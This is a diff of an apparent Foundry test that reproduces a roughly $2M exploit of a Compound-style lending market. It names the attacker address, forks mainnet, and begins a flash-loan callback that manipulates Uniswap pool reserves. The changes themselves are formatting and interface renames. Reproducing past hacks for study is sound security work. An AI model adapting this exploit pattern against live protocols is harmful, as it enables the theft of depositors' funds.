@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~$2M
 // Attacker : https://etherscan.io/address/0x085bdff2c522e8637d4154039db8746bb8642bff
@@ -17,11 +16,10 @@ import "./../interface.sol";
 
 interface IComptroller {
 
-    function liquidateCalculateSeizeTokens(
-        address cTokenBorrowed,
-        address cTokenCollateral,
-        uint256 actualRepayAmount
-    ) external view returns (uint256, uint256);
+    function liquidateCalculateSeizeTokens(address cTokenBorrowed, address cTokenCollateral, uint256 actualRepayAmount)
+        external
+        view
+        returns (uint256, uint256);
 
     function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
 
@@ -46,14 +44,14 @@ contract ContractTest is Test {
     ICErc20Delegate private constant oBTC = ICErc20Delegate(payable(0x1933f1183C421d44d531Ed40A5D2445F6a91646d));
     ICErc20Delegate private constant oLINK = ICErc20Delegate(payable(0xFEe4428b7f403499C50a6DA947916b71D33142dC));
     crETH private constant oETHER = crETH(payable(0x714bD93aB6ab2F0bcfD2aEaf46A46719991d0d79));
-    Uni_Pair_V2 private constant PEPE_WETH = Uni_Pair_V2(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
-    Uni_Pair_V2 private constant USDC_WETH = Uni_Pair_V2(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
-    Uni_Pair_V2 private constant WETH_USDT = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
-    Uni_Pair_V2 private constant PAXG_WETH = Uni_Pair_V2(0x9C4Fe5FFD9A9fC5678cFBd93Aa2D4FD684b67C4C);
-    Uni_Pair_V2 private constant DAI_WETH = Uni_Pair_V2(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
-    Uni_Pair_V2 private constant WBTC_WETH = Uni_Pair_V2(0xBb2b8038a1640196FbE3e38816F3e67Cba72D940);
-    Uni_Pair_V2 private constant LINK_WETH = Uni_Pair_V2(0xa2107FA5B38d9bbd2C461D6EDf11B11A50F6b974);
-    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IUniswapV2Pair private constant PEPE_WETH = IUniswapV2Pair(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
+    IUniswapV2Pair private constant USDC_WETH = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
+    IUniswapV2Pair private constant WETH_USDT = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
+    IUniswapV2Pair private constant PAXG_WETH = IUniswapV2Pair(0x9C4Fe5FFD9A9fC5678cFBd93Aa2D4FD684b67C4C);
+    IUniswapV2Pair private constant DAI_WETH = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
+    IUniswapV2Pair private constant WBTC_WETH = IUniswapV2Pair(0xBb2b8038a1640196FbE3e38816F3e67Cba72D940);
+    IUniswapV2Pair private constant LINK_WETH = IUniswapV2Pair(0xa2107FA5B38d9bbd2C461D6EDf11B11A50F6b974);
+    IUniswapV2Router private constant Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
 
     function setUp() public {
         vm.createSelectFork("mainnet", 18_476_512);
@@ -76,13 +74,10 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("Attacker WETH balance after exploit", WETH.balanceOf(address(this)), 18);
     }
 
-    function executeOperation(
-        address asset,
-        uint256 amount,
-        uint256 premium,
-        address initiator,
-        bytes calldata params
-    ) external returns (bool) {
+    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
+        external
+        returns (bool)
+    {
         approveAll();
         (uint112 reservePEPE, uint112 reserveWETH,) = PEPE_WETH.getReserves();
         uint256 amountOut = calcAmountOut(reservePEPE, reserveWETH, WETH.balanceOf(address(this)));
